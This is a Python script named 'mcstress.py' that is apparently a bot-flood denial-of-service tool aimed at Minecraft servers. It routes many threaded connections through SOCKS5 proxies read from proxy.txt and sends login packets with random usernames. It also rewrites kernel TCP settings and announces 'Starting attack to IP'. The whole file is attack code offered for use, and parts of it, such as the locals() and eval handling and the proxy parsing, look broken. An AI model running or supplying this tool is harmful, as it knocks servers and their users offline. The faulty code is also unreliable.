import socket, threading, sys, time, random, socks, string, os
if len(sys.argv) == 5:
    host = sys.argv[1]
    port = int(sys.argv[2])
    sockets = int(sys.argv[3])
    threads = int(sys.argv[4])
else:
    print('Start: python3 mcstress.py IP PORT SOCKETS THREADS')
    exit()
t = 0
try: f = open('proxy.txt', 'r').readlines()
except:
    print('proxy.txt not found!')
    exit()
try: host = list(socket.gethostbyname_ex(host))[2][0]
except:
    print('Can not determine the IP domain! Specify the digitizer IP manually.')
    exit()
os.system('ulimit -n 9553500')
os.system('echo 15 > /proc/sys/net/ipv4/tcp_fin_timeout')
os.system('echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse')
os.system('echo 1024 9553500 > /proc/sys/net/ipv4/ip_local_port_range')
print('Starting attack to IP: {0}'.format(host))
socket.setdefaulttimeout(3)
connects = 0
def maxim19116():
    global connects
    while 1:
        for i in range(sockets):
            m = random.choice(f)
            locals()["s" + str(i)] = socks.socksocket()
            locals()["s" + str(i)].setproxy(socks.PROXY_TYPE_SOCKS5, m[0], int(m[1]))
        for socknum in range(sockets):
            try:
                username = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))
                sock = eval('s'+str(socknum))
                sock.connect((host, int(port)))
                sock.setblocking(0)
                connects += 1
                sys.stdout.write('\r[{0} / {1}] Connected!'.format(connects, username))
                sock.sendall(b'\x06\x00/\x00\x00\x00\x02\x0c\x00\n' + username.encode())
            except Exception as err:
                eval('s'+str(socknum)).close()
                print("[{0}@{1}] Could not connect to the server: {2}".format(connects, username, err))
for i in range(threads): threading.Thread(target=maxim19116).start()
try:
    while True:
        t += 1
        if t >= 8: sys.exit()
        time.sleep( 128 * 128 * 128 )
except (KeyboardInterrupt, SystemExit): sys.exit()
